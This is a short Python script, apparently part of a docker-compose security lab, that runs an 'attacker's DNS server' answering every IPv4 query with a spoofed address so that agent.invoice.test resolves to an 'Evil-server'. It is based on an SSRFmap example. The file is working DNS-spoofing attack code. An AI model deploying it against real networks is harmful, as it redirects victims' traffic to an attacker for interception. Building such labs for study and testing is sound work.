"""Attacker's DNS server. Resolves agent.invoice.test to the attacker's IP.

Inspired by https://github.com/swisskyrepo/SSRFmap/blob/master/examples/ssrf_dns.py.
"""

import os
from dnslib import QTYPE, RR, A
from dnslib.server import BaseResolver, DNSServer


SPOOF_IP = os.environ["SPOOF_IP"] # Evil-server's IP, set in docker compose

class DNS(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        q = request.q

        print(f"Answering {request.q.qname} -> {SPOOF_IP} (Evil-server's IP)", flush=True)

        if request.q.qtype == QTYPE.A: # Only answer IPv4 (A) queries
            print(f"Spoofing {q.qname} -> {SPOOF_IP}", flush=True)
            reply.add_answer(RR(q.qname, QTYPE.A, rdata=A(SPOOF_IP)))
        
        return reply

if __name__ == "__main__":
    server = DNSServer(DNS(), port=53)
    server.start()